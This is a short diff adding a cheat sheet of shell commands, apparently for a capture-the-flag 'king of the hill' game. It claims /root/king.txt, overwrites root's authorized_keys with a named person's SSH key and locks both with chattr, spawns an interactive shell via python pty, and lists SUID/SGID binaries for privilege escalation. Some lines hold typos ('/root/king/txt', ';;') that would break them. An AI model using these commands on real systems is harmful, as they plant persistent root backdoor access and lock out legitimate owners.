@@ -1,0 +1,9 @@
+
+      chattr -i /root/king/txt ;; echo "buduboti" > /root/king.txt && chattr +i /root/king.txt
+
+      chattr -i /root/.ssh/authorized_keys ;; echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGFv8J0r/1uV4rylrjVb1BFfQMlLZ8staN+hdxE2zFlW balas.botond@codespring.ro" > /root/.ssh/authorized_keys && chattr +i /root/.ssh/authorized_keys
+
+      python -c 'import pty;pty.spawn("/bin/bash")'
+
+      find / -perm /6000 2>/dev/null | grep '/bin/' 
+
